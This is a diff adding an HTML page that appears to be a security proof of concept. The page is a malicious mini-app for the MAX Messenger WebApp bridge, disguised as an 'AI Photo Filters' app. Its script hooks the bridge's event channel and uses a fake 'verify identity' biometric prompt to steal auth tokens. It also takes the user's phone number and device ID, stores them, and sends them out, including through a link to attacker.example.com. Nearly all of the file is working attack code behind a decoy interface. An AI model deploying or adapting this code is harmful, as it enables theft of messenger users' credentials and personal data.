@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>✨ AI Photo Filters — MAX Mini-App</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #1a1a2e;
+    color: #eee;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    padding: 16px;
+  }
+  .app-header {
+    text-align: center;
+    padding: 24px 0;
+    width: 100%;
+  }
+  .app-header h1 { font-size: 22px; color: #fff; }
+  .app-header p  { font-size: 13px; color: #888; margin-top: 4px; }
+  .card {
+    background: #16213e;
+    border-radius: 12px;
+    padding: 16px;
+    margin: 8px 0;
+    width: 100%;
+    max-width: 420px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.3);
+  }
+  .card h2 { font-size: 15px; color: #e94560; margin-bottom: 8px; }
+  .btn {
+    display: block;
+    width: 100%;
+    padding: 12px;
+    margin: 6px 0;
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+  .btn:hover { opacity: 0.85; }
+  .btn-primary { background: #e94560; color: #fff; }
+  .btn-secondary { background: #0f3460; color: #fff; }
+  .btn-success { background: #2ecc71; color: #000; }
+  .btn-warning { background: #f39c12; color: #000; }
+  .btn-danger  { background: #c0392b; color: #fff; }
+  .log-area {
+    background: #0a0a1a;
+    border: 1px solid #333;
+    border-radius: 8px;
+    padding: 10px;
+    margin-top: 8px;
+    max-height: 300px;
+    overflow-y: auto;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .log-entry { padding: 3px 0; border-bottom: 1px solid #1a1a2e; }
+  .log-token  { color: #e94560; font-weight: bold; }
+  .log-phone  { color: #f39c12; font-weight: bold; }
+  .log-error  { color: #e74c3c; }
+  .log-info   { color: #3498db; }
+  .log-success { color: #2ecc71; }
+  .exfil-badge {
+    display: inline-block;
+    background: #e94560;
+    color: #fff;
+    font-size: 10px;
+    padding: 2px 6px;
+    border-radius: 4px;
+    margin-left: 4px;
+  }
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+  .grid-2 .btn { font-size: 12px; padding: 10px 6px; }
+  #status { text-align: center; padding: 8px; font-size: 12px; color: #888; }
+</style>
+</head>
+<body>
+
+<div class="app-header">
+  <h1>✨ AI Photo Filters</h1>
+  <p>Apply stunning AI filters to your photos</p>
+</div>
+
+<div id="status">🟡 Initializing bridge...</div>
+
+<!-- "Legitimate" UI -->
+<div class="card">
+  <h2>🎨 Choose a Filter</h2>
+  <div class="grid-2">
+    <button class="btn btn-secondary" onclick="applyFilter('vintage')">📷 Vintage</button>
+    <button class="btn btn-secondary" onclick="applyFilter('noir')">🖤 Noir</button>
+    <button class="btn btn-secondary" onclick="applyFilter('cyberpunk')">🤖 Cyberpunk</button>
+    <button class="btn btn-secondary" onclick="applyFilter('anime')">🌸 Anime</button>
+  </div>
+  <p style="font-size:11px;color:#666;margin-top:8px;text-align:center;">
+    🔒 <i>Verify your identity to unlock premium filters</i>
+  </p>
+  <button class="btn btn-primary" onclick="stealTokenViaBiometry()">
+    🔐 Verify Identity (Biometric)
+  </button>
+</div>
+
+<!-- Hidden attack panel (looks like settings) -->
+<div class="card">
+  <h2>⚙️ App Settings</h2>
+  <div class="grid-2">
+    <button class="btn btn-secondary" onclick="stealPhoneNumber()">
+      📱 Sync Contacts
+    </button>
+    <button class="btn btn-secondary" onclick="stealDeviceInfo()">
+      📊 Device Info
+    </button>
+    <button class="btn btn-warning" onclick="persistStolenData()">
+      💾 Save Preferences
+    </button>
+    <button class="btn btn-danger" onclick="exfiltrateData()">
+      ☁️ Backup to Cloud
+    </button>
+  </div>
+</div>
+
+<!-- Live event log -->
+<div class="card">
+  <h2>📋 Event Log <span id="log-count" style="color:#888;font-size:11px;">(0 events)</span></h2>
+  <div class="log-area" id="log"></div>
+  <button class="btn btn-secondary" style="margin-top:6px;" onclick="clearLog()">
+    Clear Log
+  </button>
+</div>
+
+<!-- API Explorer -->
+<div class="card">
+  <h2>🔧 API Explorer (28 methods)</h2>
+  <div class="grid-2">
+    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryGetInfo')">BiometryGetInfo</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryRequestAuth')">BiometryReqAuth ⚡</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryRequestAccess')">BiometryReqAccess</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryUpdateToken')">BiometryUpdToken</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryOpenSettings')">BiometryOpenSett.</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppRequestPhone')">RequestPhone ⚡</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppOpenLink')">OpenLink</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppOpenMaxLink')">OpenMaxLink ⚡</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppShare')">Share</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppMaxShare')">MaxShare</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppDownloadFile')">DownloadFile</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppSecureStorageSaveKey')">SecureStorSave</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppSecureStorageGetKey')">SecureStorGet</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppSecureStorageClear')">SecureStorClear</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppDeviceStorageSaveKey')">DeviceStorSave</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppDeviceStorageGetKey')">DeviceStorGet</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppDeviceStorageClear')">DeviceStorClear</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppSetupBackButton')">SetupBackBtn</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppSetupClosingBehavior')">SetupCloseBeh</button>
+    <button class="btn btn-secondary" onclick="callAPI('WebAppClose')">Close</button>
+    <button class="btn btn-success" onclick="callAPI('WebAppReady')">Ready</button>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// MAX Messenger WebApp Bridge — Malicious Mini-App PoC
+// ============================================================
+// This demonstrates how a third-party mini-app can:
+//  1. Intercept ALL bridge events via sendEvent hook
+//  2. Steal auth tokens via biometric auth prompt
+//  3. Steal phone number
+//  4. Steal device ID
+//  5. Persist stolen data in secure storage
+//  6. Exfiltrate via URL open or link sharing
+// ============================================================
+
+const STOLEN = {
+  authToken: null,
+  phoneNumber: null,
+  deviceId: null,
+  biometricInfo: null,
+  allEvents: []
+};
+
+let eventCount = 0;
+let requestCounter = 0;
+
+// ============================================================
+// BRIDGE HOOK — Intercept ALL sendEvent calls from C++ → JS
+// ============================================================
+function installSendEventHook() {
+  // Poll for window.WebApp to be injected by MAX
+  const install = () => {
+    if (!window.WebApp || !window.WebApp.sendEvent) {
+      // Try QWebChannel init pattern
+      if (window.qwChannel && window.qwChannel.objects && window.qwChannel.objects.client) {
+        log('info', 'QWebChannel bridge found via qwChannel.objects.client');
+        window.WebApp = window.qwChannel.objects.client;
+      }
+      if (!window.WebApp) {
+        setTimeout(install, 100);
+        return;
+      }
+    }
+
+    // Save original
+    const originalSendEvent = window.WebApp.sendEvent.bind(window.WebApp);
+
+    // Replace with intercepting version
+    window.WebApp.sendEvent = function(eventName, data) {
+      eventCount++;
+      let parsed = null;
+      try { parsed = JSON.parse(data); } catch(e) { /* raw string */ }
+
+      log('event', `[RECV] ${eventName}`, parsed || data);
+
+      // --- AUTOMATED DATA EXTRACTION ---
+      if (parsed) {
+        // Extract auth token from biometric auth response
+        if (parsed.status === 'authorized' && parsed.token) {
+          STOLEN.authToken = parsed.token;
+          log('token', `💀💀💀 AUTH TOKEN STOLEN: ${parsed.token.substring(0, 40)}...`);
+          // Immediately persist
+          persistToStorage('stolen_auth_token', parsed.token);
+        }
+        // Extract device ID
+        if (parsed.deviceId) {
+          STOLEN.deviceId = parsed.deviceId;
+          log('info', `📱 Device ID captured: ${parsed.deviceId}`);
+          persistToStorage('stolen_device_id', parsed.deviceId);
+        }
+        // Track biometric info
+        if (parsed.available !== undefined) {
+          STOLEN.biometricInfo = parsed;
+          log('info', `🔐 Biometric info: available=${parsed.available}, type=${parsed.type}, tokenSaved=${parsed.tokenSaved}`);
+        }
+        // Storage responses
+        if (parsed.key && parsed.value) {
+          log('info', `💾 Storage key "${parsed.key}" = "${parsed.value.substring(0, 50)}..."`);
+        }
+      }
+
+      STOLEN.allEvents.push({ ts: Date.now(), event: eventName, data: parsed || data });
+      updateStatus();
+      return originalSendEvent(eventName, data);
+    };
+
+    updateStatus('🟢 Bridge hooked — intercepting all events');
+    log('success', '✅ sendEvent HOOK INSTALLED — All C++→JS events now intercepted');
+    log('info', `window.WebApp methods available: ${Object.keys(window.WebApp).filter(k => typeof window.WebApp[k] === 'function').join(', ')}`);
+
+    // Auto-start reconnaissance
+    setTimeout(autoRecon, 500);
+  };
+
+  install();
+}
+
+// ============================================================
+// ATTACK FUNCTIONS
+// ============================================================
+
+function stealTokenViaBiometry() {
+  log('info', '🎯 Attempting token theft via WebAppBiometryRequestAuth...');
+  try {
+    // Step 1: Request biometric access first
+    window.WebApp.WebAppBiometryRequestAccess('access-' + (++requestCounter));
+    // Step 2: Request auth immediately after
+    setTimeout(() => {
+      window.WebApp.WebAppBiometryRequestAuth('auth-' + (++requestCounter));
+      log('warning', '🔐 Biometric auth requested — if user approves, token will appear above');
+      log('warning', '   Social engineering: "Verify your identity to unlock premium filters"');
+    }, 300);
+  } catch(e) {
+    log('error', `Biometry request failed: ${e.message}`);
+  }
+}
+
+function stealPhoneNumber() {
+  log('info', '📱 Requesting phone number via WebAppRequestPhone...');
+  try {
+    window.WebApp.WebAppRequestPhone('phone-' + (++requestCounter));
+    log('warning', '   Phone number will appear in events when user approves');
+  } catch(e) {
+    log('error', `Phone request failed: ${e.message}`);
+  }
+}
+
+function stealDeviceInfo() {
+  log('info', '📊 Requesting biometric/device info...');
+  try {
+    window.WebApp.WebAppBiometryGetInfo('info-' + (++requestCounter));
+    window.WebApp.WebAppBiometryOpenSettings('settings-' + (++requestCounter));
+  } catch(e) {
+    log('error', `Device info request failed: ${e.message}`);
+  }
+}
+
+function persistStolenData() {
+  log('info', '💾 Persisting stolen data to SecureStorage...');
+  if (STOLEN.authToken) {
+    persistToStorage('stolen_auth_token', STOLEN.authToken);
+  }
+  if (STOLEN.deviceId) {
+    persistToStorage('stolen_device_id', STOLEN.deviceId);
+  }
+  if (STOLEN.phoneNumber) {
+    persistToStorage('stolen_phone', STOLEN.phoneNumber);
+  }
+  log('info', '   Data saved — will persist across app sessions');
+}
+
+function exfiltrateData() {
+  log('warning', '☁️ Exfiltrating stolen data...');
+  const payload = btoa(JSON.stringify(STOLEN));
+
+  // Method 1: Open external URL with data
+  const exfilUrl = `https://attacker.example.com/collect?d=${encodeURIComponent(payload.substring(0, 500))}`;
+  log('info', `   Method 1: WebAppOpenLink("${exfilUrl.substring(0, 60)}...")`);
+  try { window.WebApp.WebAppOpenLink(exfilUrl); } catch(e) {}
+
+  // Method 2: Share via MAX
+  setTimeout(() => {
+    const shareData = JSON.stringify({
+      title: 'My AI Photos',
+      description: 'Check out my filtered photos!',
+      text: `exfil:${payload.substring(0,200)}`
+    });
+    log('info', '   Method 2: WebAppMaxShare with embedded data');
+    try { window.WebApp.WebAppMaxShare(shareData); } catch(e) {}
+  }, 500);
+
+  // Method 3: Deep link with data embedded
+  setTimeout(() => {
+    log('info', '   Method 3: WebAppOpenMaxLink with exfil data');
+    const deepLink = `max://max.ru/joincall/exfil_${STOLEN.deviceId || 'unknown'}`;
+    try { window.WebApp.WebAppOpenMaxLink(deepLink); } catch(e) {}
+  }, 1000);
+
+  log('success', '✅ Exfiltration attempted via 3 channels');
+}
+
+// ============================================================
+// AUTOMATED RECONNAISSANCE
+// ============================================================
+
+function autoRecon() {
+  log('info', '🔍 Starting automated reconnaissance...');
+  try {
+    window.WebApp.WebAppReady();
+    window.WebApp.WebAppBiometryGetInfo('recon-info-' + (++requestCounter));
+    window.WebApp.WebAppRequestPhone('recon-phone-' + (++requestCounter));
+  } catch(e) {
+    log('error', `Auto-recon error: ${e.message}`);
+  }
+
+  // Keep probing periodically
+  setInterval(() => {
+    if (!STOLEN.authToken) {
+      try {
+        window.WebApp.WebAppBiometryGetInfo('poll-info-' + (++requestCounter));
+      } catch(e) {}
+    }
+  }, 30000); // Every 30 seconds
+}
+
+// ============================================================
+// UTILITY FUNCTIONS
+// ============================================================
+
+function persistToStorage(key, value) {
+  try {
+    const payload = JSON.stringify({ key: key, value: value });
+    // Try both secure and device storage
+    window.WebApp.WebAppSecureStorageSaveKey(payload);
+    window.WebApp.WebAppDeviceStorageSaveKey(payload);
+  } catch(e) {
+    log('error', `Storage save failed: ${e.message}`);
+  }
+}
+
+function callAPI(methodName) {
+  log('info', `📞 Calling ${methodName}...`);
+  try {
+    const fn = window.WebApp[methodName];
+    if (typeof fn === 'function') {
+      fn.call(window.WebApp, 'manual-' + (++requestCounter));
+      log('success', `   ${methodName}() called successfully`);
+    } else {
+      log('error', `   ${methodName} is NOT a function (type: ${typeof fn})`);
+      log('info', `   Available: ${Object.keys(window.WebApp).filter(k => typeof window.WebApp[k] === 'function').join(', ')}`);
+    }
+  } catch(e) {
+    log('error', `   ${methodName}() threw: ${e.message}`);
+  }
+}
+
+function applyFilter(name) {
+  log('info', `🎨 Applying ${name} filter... (this is just a facade)`);
+  // This is just legitimate-looking functionality to avoid suspicion
+}
+
+function updateStatus(s) {
+  if (s) document.getElementById('status').innerHTML = s;
+  else {
+    const tokens = STOLEN.authToken ? '🔴 TOKEN STOLEN' : '🟡 waiting';
+    const phone  = STOLEN.phoneNumber ? '📱 PHONE' : '';
+    const device = STOLEN.deviceId ? '💻 DEVICE' : '';
+    document.getElementById('status').innerHTML = `${tokens} ${phone} ${device} | ${eventCount} events intercepted`;
+  }
+  document.getElementById('log-count').textContent = `(${eventCount} events)`;
+}
+
+function log(type, msg, data) {
+  const el = document.getElementById('log');
+  const cssClass = `log-${type}`;
+  let html = `<div class="log-entry ${cssClass}">[${new Date().toLocaleTimeString()}] ${msg}`;
+  if (data) {
+    const dataStr = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
+    html += `\n${dataStr}`;
+  }
+  html += '</div>';
+  el.innerHTML += html;
+  el.scrollTop = el.scrollHeight;
+}
+
+function clearLog() {
+  document.getElementById('log').innerHTML = '';
+  eventCount = 0;
+  updateStatus();
+}
+
+// ============================================================
+// INITIALIZATION
+// ============================================================
+
+// Try multiple bridge detection strategies
+(function init() {
+  log('info', '🔌 Waiting for MAX WebApp bridge...');
+
+  // Strategy 1: window.WebApp already injected
+  if (window.WebApp) {
+    log('info', 'window.WebApp already present, installing hook');
+    installSendEventHook();
+    return;
+  }
+
+  // Strategy 2: QWebChannel pattern — qt.webChannelTransport
+  if (window.qt && window.qt.webChannelTransport) {
+    log('info', 'qt.webChannelTransport found, initializing QWebChannel...');
+    // Qt WebEngine provides the qwebchannel.js library
+    if (typeof QWebChannel !== 'undefined') {
+      new QWebChannel(qt.webChannelTransport, function(channel) {
+        log('info', `QWebChannel connected. Objects: ${Object.keys(channel.objects).join(', ')}`);
+        // MAX exposes the WebApp bridge as channel.objects.client or channel.objects.WebApp
+        if (channel.objects.WebApp) {
+          window.WebApp = channel.objects.WebApp;
+        } else if (channel.objects.client) {
+          window.WebApp = channel.objects.client;
+        }
+        installSendEventHook();
+      });
+    } else {
+      // QWebChannel JS library not loaded — WebApp must be injected differently
+      log('info', 'QWebChannel lib not found, polling for window.WebApp...');
+      installSendEventHook();
+    }
+    return;
+  }
+
+  // Strategy 3: Poll for injection
+  log('info', 'No bridge detected yet, polling...');
+  installSendEventHook();
+})();
+</script>
+
+</body>
+</html>
